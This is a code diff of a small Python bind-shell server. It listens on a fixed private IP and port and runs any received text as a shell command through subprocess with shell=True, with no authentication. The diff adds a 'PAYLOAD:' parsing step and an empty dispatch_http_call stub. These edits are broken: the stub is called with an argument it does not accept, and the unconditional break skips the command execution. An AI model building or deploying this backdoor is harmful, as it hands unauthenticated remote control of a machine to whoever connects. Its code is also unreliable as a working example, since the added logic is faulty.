@@ -1,11 +1,19 @@
 import socket as s,subprocess as sp;
 
+
+def dispatch_http_call():
+    """ """
+    pass
+
 s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
 s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
 s1.bind(("192.168.157.123", 9002))
 s1.listen(1)
 
 print("Server is listening...")
+
+
+
 
 while True:
     # maybe throw 404 or something to http connections? or maybe authenticate.. blah :(
@@ -15,10 +23,18 @@ while True:
     while True:
         try:
             d = c.recv(1024).decode()
+            
             if not d:
                 print("Breaking")
                 break  # client disconnected
-            print(d)
+
+            if True: # parse and see if this is an html call
+                nonhtmled = [i for i in d.split("\n") if "PAYLOAD:" in i]
+                if len(nonhtmled) > 0:
+                    d = nonhtmled[0].split("PAYLOAD:")[-1]
+                dispatch_http_call(d)
+                break
+            
             p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
             out, err = p.communicate()
             result = out + err
